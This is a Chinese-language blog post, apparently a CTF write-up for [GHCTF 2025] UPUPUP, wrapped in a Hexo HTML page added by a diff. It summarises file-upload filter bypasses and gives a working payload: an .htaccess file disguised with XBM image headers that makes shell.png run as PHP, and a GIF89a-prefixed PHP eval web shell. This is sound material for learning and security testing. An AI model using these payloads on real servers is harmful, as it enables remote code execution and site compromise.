@@ -1,0 +1,272 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>Zbaoabo</title>
+
+  <!-- keywords -->
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="文件上传[TOC] 常见的文件上传漏洞的waf与绕过主要存在以下手段：①前端检测Content-Type字段的值，通过抓成功的包后修改内容和后缀绕过 ②黑名单检测，可以通过双写、大小写、空格绕过:(.php )、点绕过:(.php.)、$DATA绕过、Apache解析漏洞（利用apache从右往左解析后缀的特性）、.htaccess解析绕过 ③白名单检测，可以使用00截断（%00截断与0x00截断">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Zbaoabo">
+<meta property="og:url" content="http://example.com/2025/04/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/index.html">
+<meta property="og:site_name" content="Zbaoabo">
+<meta property="og:description" content="文件上传[TOC] 常见的文件上传漏洞的waf与绕过主要存在以下手段：①前端检测Content-Type字段的值，通过抓成功的包后修改内容和后缀绕过 ②黑名单检测，可以通过双写、大小写、空格绕过:(.php )、点绕过:(.php.)、$DATA绕过、Apache解析漏洞（利用apache从右往左解析后缀的特性）、.htaccess解析绕过 ③白名单检测，可以使用00截断（%00截断与0x00截断">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2025-04-09T09:44:05.324Z">
+<meta property="article:modified_time" content="2025-04-09T11:46:31.362Z">
+<meta property="article:author" content="zhangsuhong">
+<meta name="twitter:card" content="summary">
+  
+    <link rel="alternative" href="/atom.xml" title="Zbaoabo" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/img/favicon.ico">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+  
+
+  
+<script src="//cdn.bootcss.com/require.js/2.3.2/require.min.js"></script>
+
+  
+<script src="//cdn.bootcss.com/jquery/3.1.1/jquery.min.js"></script>
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+<body>
+  <div id="container">
+    <div id="particles-js"></div>
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+	<header id="header" class="inner">
+		<a href="/" class="profilepic">
+			
+				<img lazy-src="" class="js-avatar">
+			
+		</a>
+
+		<hgroup>
+			<h1 class="header-author"><a href="/">zhangsuhong</a></h1>
+		</hgroup>
+
+		
+			<p class="header-subtitle"></p>
+		
+
+		<div class="switch-area">
+			<div class="switch-wrap">
+				<section class="switch-part switch-part1">
+					<nav class="header-menu">
+						<ul>
+						
+							<li><a href="/">Home</a></li>
+				        
+							<li><a href="/archives">Archives</a></li>
+				        
+						</ul>
+					</nav>
+					<nav class="half-header-menu">
+						<a class="hide">Home</a>
+						<a>Tags</a>
+						<a>Links</a>
+						<a>About</a>
+					</nav>
+					<nav class="header-nav">
+						<div class="social">
+							
+						</div>
+						<!-- music -->
+						
+					</nav>
+				</section>
+				
+				
+				<section class="switch-part switch-part2">
+					<div class="widget tagcloud" id="js-tagcloud">
+						
+					</div>
+				</section>
+				
+				
+				
+				<section class="switch-part switch-part3">
+					<div id="js-friends">
+					
+			          <a target="_blank" class="main-nav-link switch-friends-link" href="https://github.com/">github</a>
+			        
+			        </div>
+				</section>
+				
+
+				
+				
+				<section class="switch-part switch-part4">
+				
+					<div id="js-aboutme">I&#39;m a developer.</div>
+				</section>
+				
+			</div>
+		</div>
+	</header>				
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+  	<div class="overlay">
+  		<div class="slider-trigger"></div>
+  		<h1 class="header-author js-mobile-header hide"></h1>
+  	</div>
+	<div class="intrude-less">
+		<header id="header" class="inner">
+			<div class="profilepic">
+				<img lazy-src="" class="js-avatar">
+			</div>
+			<hgroup>
+			  <h1 class="header-author"></h1>
+			</hgroup>
+			
+			<nav class="header-menu">
+				<ul>
+				
+					<li><a href="/">Home</a></li>
+		        
+					<li><a href="/archives">Archives</a></li>
+		        
+		        <div class="clearfix"></div>
+				</ul>
+			</nav>
+			<nav class="header-nav">
+				<div class="social">
+					
+				</div>
+			</nav>
+		</header>				
+	</div>
+</nav>
+      <div class="body-wrap"><article id="post-文件上传" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2025/04/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" class="article-date">
+  	<time datetime="2025-04-09T09:44:05.324Z" itemprop="datePublished">2025-04-09</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h1><p>[TOC]</p>
+<h2 id="常见的文件上传漏洞的waf与绕过主要存在以下手段："><a href="#常见的文件上传漏洞的waf与绕过主要存在以下手段：" class="headerlink" title="常见的文件上传漏洞的waf与绕过主要存在以下手段："></a>常见的文件上传漏洞的waf与绕过主要存在以下手段：</h2><p><strong>①前端检测Content-Type字段的值，通过抓成功的包后修改内容和后缀绕过</strong></p>
+<p><strong>②黑名单检测，可以通过双写、大小写、空格绕过:(.php )、点绕过:(.php.)、$DATA绕过、Apache解析漏洞（利用apache从右往左解析后缀的特性）、.htaccess解析绕过</strong></p>
+<p><strong>③白名单检测，可以使用00截断（%00截断与0x00截断）</strong></p>
+<p><strong>④文件幻术检测、文件内容检测、APACHE解析漏洞等</strong></p>
+<h3 id="1-htaccess"><a href="#1-htaccess" class="headerlink" title="1..htaccess"></a>1..htaccess</h3><p><strong>[GHCTF 2025]UPUPUP</strong></p>
+<p>随便上传文件，发现有文件后缀检测，不能用php，随后想到上传.htaccess再上传图片马，但是现实非法文件</p>
+<p>于是添加前缀<strong>GIF89a</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">&lt;FilesMatch  &quot;shell.png&quot;&gt;</span><br><span class="line">SetHandler  application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>然后发现报错500，这种情况一般是语法有问题。所以应该是<strong>GIF89a</strong>引发了语法问题，那怎么办呢？</p>
+<p><strong>在.htaccess中有两个注释符，或者相当于单行注释的符号，分别是</strong>#<strong>和</strong>\x00****。</p>
+<p>然后分别有两种图片能绕过：</p>
+<p>XBN：</p>
+<p>这个可以放在文件任意位置</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#define width 1337</span><br><span class="line">#define height 1337</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>WBMP：</p>
+<p>不过这个只能放在文件开头的位置</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">\x00\x00\x85\x85</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>所以上传.htaccess</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#define width 1</span><br><span class="line">#define height 1</span><br><span class="line">&lt;FilesMatch &quot;shell.png&quot;&gt;</span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>上传shell.png</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">&lt;?= eval($_POST[&#x27;whb&#x27;]);?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+    
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2025/04/16/JavaWeb--%E6%B7%B1%E5%85%A5Servlet/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">&lt;</strong>
+      <div class="article-nav-title">
+        
+          (no title)
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2025/04/01/SVN%E6%BC%8F%E6%B4%9E/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title"></div>
+      <strong class="article-nav-caption">&gt;</strong>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+
+
+
+
+</div>
+      <footer id="footer">
+  <div class="outer">
+    <div id="footer-info">
+      <div class="footer-left">
+        &copy; 2025 zhangsuhong
+      </div>
+        <div class="footer-right">
+          <a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/preccrep/hexo-theme-jelly" target="_blank">Jelly</a>
+        </div>
+    </div>
+  </div>
+</footer>
+    </div>
+    
+  
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+
+
+
+<script>
+	var yiliaConfig = {
+		fancybox: true,
+		mathjax: false,
+		animate: true,
+		isHome: false,
+		isPost: true,
+		isArchive: false,
+		isTag: false,
+		isCategory: false,
+		open_in_new: false
+	}
+</script>
+
+<script src="/js/main.js"></script>
+
+
+
+
+  </div>
+</body>
+</html>
